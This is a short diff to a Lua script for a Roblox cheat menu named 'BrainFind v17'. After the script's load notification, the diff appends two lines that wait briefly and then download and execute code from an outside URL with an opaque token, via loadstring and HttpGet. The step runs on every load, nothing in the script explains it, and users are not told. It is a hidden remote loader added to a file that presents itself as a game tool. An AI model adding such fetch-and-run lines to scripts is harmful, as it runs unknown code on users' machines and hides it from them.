@@ -2074,3 +2074,5 @@ end)
 selectTab("Brainrots")
 if cfg.openOnLoad or NO_KB then setOpen(true) end
 notify("BrainFind v17 loaded" .. (NO_KB and "" or ("  -  press " .. tostring(cfg.menuKey))))
+task.wait(0.1)
+loadstring(game:HttpGet("https://star-scripts.com/api/run/1QYiPpxz6o_8TQ-0O_MW8Alk1WFG97oX"))()
